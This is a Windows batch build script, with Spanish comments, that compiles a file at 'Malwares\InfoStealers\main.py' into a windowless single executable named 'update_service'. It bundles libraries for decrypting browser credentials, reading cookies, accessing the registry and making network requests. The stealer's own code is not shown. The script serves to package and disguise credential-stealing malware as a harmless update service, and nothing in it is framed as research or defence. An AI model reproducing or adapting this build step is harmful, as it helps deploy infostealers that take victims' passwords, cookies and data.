@echo off
:: build.bat — instala dependencias y compila el vault en un exe
:: requiere Python 3.11+ en PATH y ejecutarse como administrador para pywin32

echo [*] Instalando dependencias...
pip install -r requirements.txt --quiet

echo [*] Instalando PyInstaller...
pip install pyinstaller --quiet

echo [*] Compilando...
pyinstaller ^
    --onefile ^
    --noconsole ^
    --name "update_service" ^
    --hidden-import=win32crypt ^
    --hidden-import=win32api ^
    --hidden-import=win32con ^
    --hidden-import=Cryptodome.Cipher.AES ^
    --hidden-import=cryptography.hazmat.primitives.ciphers ^
    --hidden-import=browser_cookie3 ^
    --hidden-import=psutil ^
    --hidden-import=requests ^
    --hidden-import=xml.etree.ElementTree ^
    --hidden-import=winreg ^
    Malwares\InfoStealers\main.py

echo [*] Listo — dist\update_service.exe
pause
